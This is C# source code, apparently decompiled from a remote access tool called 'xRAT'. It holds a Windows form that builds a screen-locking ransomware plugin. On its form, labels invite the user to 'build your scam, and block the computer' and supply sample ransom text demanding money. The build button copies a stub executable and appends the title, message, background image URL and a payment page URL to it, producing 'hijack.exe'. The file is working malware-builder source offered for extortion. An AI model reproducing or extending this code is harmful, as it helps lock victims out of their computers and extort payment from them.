namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class hijackb : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("ComboBox1")]
        private ComboBox _ComboBox1;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("Label3")]
        private Label _Label3;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        [AccessedThroughProperty("TextBox3")]
        private TextBox _TextBox3;
        [AccessedThroughProperty("TextBox4")]
        private TextBox _TextBox4;
        private IContainer icontainer_0;

        public hijackb()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.hijackb_Load);
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                string path = FileSystem.CurDir() + @"\data\datahijack.exe";
                if (!File.Exists(path))
                {
                    Application.Exit();
                }
                else
                {
                    if (File.Exists("hijack.exe"))
                    {
                        File.Delete("hijack.exe");
                    }
                    File.Copy(path, FileSystem.CurDir() + @"\hijack.exe");
                    File.AppendAllText(FileSystem.CurDir() + @"\hijack.exe", "Dico" + this.TextBox1.Text + "Dico" + this.TextBox2.Text + "Dico" + this.TextBox3.Text + "Dico" + this.ComboBox1.Text + "Dico" + this.TextBox4.Text);
                    MessageBox.Show("Hijack.exe is build.", "Hijack", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void hijackb_Load(object sender, EventArgs e)
        {
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(hijackb));
            this.TextBox1 = new TextBox();
            this.TextBox2 = new TextBox();
            this.Label1 = new Label();
            this.TextBox3 = new TextBox();
            this.Label2 = new Label();
            this.ComboBox1 = new ComboBox();
            this.Label3 = new Label();
            this.TextBox4 = new TextBox();
            this.Button1 = new Button();
            this.SuspendLayout();
            Point point = new Point(12, 0x29);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            Size size = new Size(0x117, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 0;
            this.TextBox1.Text = "---> Title of Windows Form";
            point = new Point(12, 0x44);
            this.TextBox2.Location = point;
            this.TextBox2.Multiline = true;
            this.TextBox2.Name = "TextBox2";
            size = new Size(0x117, 0x47);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 1;
            this.TextBox2.Text = "Text to show in the center of the form. (ex: Give me your money or your computer is dead)";
            this.Label1.AutoSize = true;
            point = new Point(13, 13);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            size = new Size(0x116, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 2;
            this.Label1.Text = "Build your scam, and block the computer with this plugin.";
            point = new Point(12, 0x91);
            this.TextBox3.Location = point;
            this.TextBox3.Name = "TextBox3";
            size = new Size(0x117, 0x15);
            this.TextBox3.Size = size;
            this.TextBox3.TabIndex = 3;
            this.TextBox3.Text = "http://www.site.com/background_picture.png";
            this.Label2.AutoSize = true;
            point = new Point(13, 0xb3);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x48, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 4;
            this.Label2.Text = "Color of text:";
            this.ComboBox1.FormattingEnabled = true;
            this.ComboBox1.Items.AddRange(new object[] { "Black", "White" });
            point = new Point(0x52, 0xb0);
            this.ComboBox1.Location = point;
            this.ComboBox1.Name = "ComboBox1";
            size = new Size(0xd1, 0x15);
            this.ComboBox1.Size = size;
            this.ComboBox1.TabIndex = 5;
            this.ComboBox1.Text = "Black";
            this.Label3.AutoSize = true;
            point = new Point(0x12, 0xcc);
            this.Label3.Location = point;
            this.Label3.Name = "Label3";
            size = new Size(0x10d, 13);
            this.Label3.Size = size;
            this.Label3.TabIndex = 6;
            this.Label3.Text = "Url of your page of payment: (starpass,paypal ect....)";
            point = new Point(12, 220);
            this.TextBox4.Location = point;
            this.TextBox4.Name = "TextBox4";
            size = new Size(0x117, 0x15);
            this.TextBox4.Size = size;
            this.TextBox4.TabIndex = 7;
            this.TextBox4.Text = "http://www.site.com/starpass.php";
            point = new Point(12, 0xf7);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(0x117, 0x42);
            this.Button1.Size = size;
            this.Button1.TabIndex = 8;
            this.Button1.Text = ":: Build Plugin ::";
            this.Button1.UseVisualStyleBackColor = true;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(0x12f, 0x151);
            this.ClientSize = size;
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.TextBox4);
            this.Controls.Add(this.Label3);
            this.Controls.Add(this.ComboBox1);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.TextBox3);
            this.Controls.Add(this.Label1);
            this.Controls.Add(this.TextBox2);
            this.Controls.Add(this.TextBox1);
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.Name = "hijackb";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Hijack Computer";
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual ComboBox ComboBox1
        {
            get
            {
                return this._ComboBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ComboBox1 = value;
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return this._Label3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label3 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox2 = value;
            }
        }

        internal virtual TextBox TextBox3
        {
            get
            {
                return this._TextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox3 = value;
            }
        }

        internal virtual TextBox TextBox4
        {
            get
            {
                return this._TextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox4 = value;
            }
        }
    }
}

